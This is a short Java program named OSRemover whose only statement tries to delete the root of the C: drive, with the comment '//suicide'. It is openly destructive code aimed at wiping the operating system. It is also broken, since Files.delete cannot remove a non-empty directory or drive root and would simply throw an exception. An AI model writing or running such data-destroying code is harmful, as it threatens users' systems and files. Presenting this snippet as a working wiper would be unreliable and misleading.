import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

public class OSRemover {
    public static void main(String[] args) {
        try {
            //suicide
            Files.delete(Path.of("C:\\"));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
